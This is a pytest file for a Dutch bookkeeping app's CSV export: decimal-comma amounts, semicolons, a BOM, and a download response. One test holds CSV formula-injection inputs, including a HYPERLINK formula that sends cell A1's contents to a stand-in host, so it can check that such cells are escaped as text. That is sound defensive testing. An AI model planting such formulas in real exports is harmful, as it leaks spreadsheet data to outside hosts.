# SPDX-FileCopyrightText: 2026 Huismus contributors
# SPDX-License-Identifier: AGPL-3.0-or-later
"""The one CSV form of Huismus (SPEC.md M19): semicolons, a decimal comma,
ISO dates and UTF-8 with a BOM, so Dutch Excel opens it."""

from datetime import date
from decimal import Decimal

import pytest

from huismus.core.csv_files import Amount, csv_bytes, csv_response


@pytest.mark.parametrize(
    ("cents", "text"),
    [
        (1000, "10,00"),
        (5, "0,05"),
        (-9339, "-93,39"),
        (-5, "-0,05"),
        (0, "0,00"),
        (123456789, "1234567,89"),
    ],
)
def test_amounts_have_a_decimal_comma_and_no_thousands_separator(cents, text):
    # Rule 1: money is integer cents, also on its way out.
    assert csv_bytes(["bedrag"], [[Amount(cents)]]).decode("utf-8-sig").splitlines()[1] == text


def test_values_dates_quantities_and_empty_cells():
    rows = [[date(2026, 11, 2), Decimal("2.500"), Decimal("1.000"), None, "a;b", 7]]
    line = csv_bytes(["a", "b", "c", "d", "e", "f"], rows).decode("utf-8-sig").splitlines()[1]
    assert line == '2026-11-02;2,5;1;;"a;b";7'


def test_starts_with_a_bom_and_uses_semicolons():
    raw = csv_bytes(["één", "twee"], [])
    assert raw.startswith("﻿".encode())
    assert raw.decode("utf-8-sig").splitlines() == ["één;twee"]


def test_the_response_is_a_download():
    response = csv_response("jaaroverzicht-2026.csv", ["a"], [[Amount(1)]])
    assert response["Content-Type"] == "text/csv; charset=utf-8"
    assert response["Content-Disposition"] == 'attachment; filename="jaaroverzicht-2026.csv"'


@pytest.mark.parametrize(
    "text",
    ['=HYPERLINK("http://example.invalid/?"&A1;"x")', "+31 6 1234", "-korting", "@SUM(A1)"],
)
def test_text_that_a_spreadsheet_would_run_as_a_formula_is_kept_as_text(text):
    # Supplier names and descriptions can come from an import: a cell that
    # starts like a formula gets a ' in front, so Excel shows it as text.
    line = csv_bytes(["omschrijving"], [[text]]).decode("utf-8-sig").splitlines()[1]
    assert line.lstrip('"').startswith("'" + text[0])


def test_amounts_and_plain_text_are_left_alone():
    line = csv_bytes(["a", "b"], [[Amount(-500), "Koffie"]]).decode("utf-8-sig").splitlines()[1]
    assert line == "-5,00;Koffie"
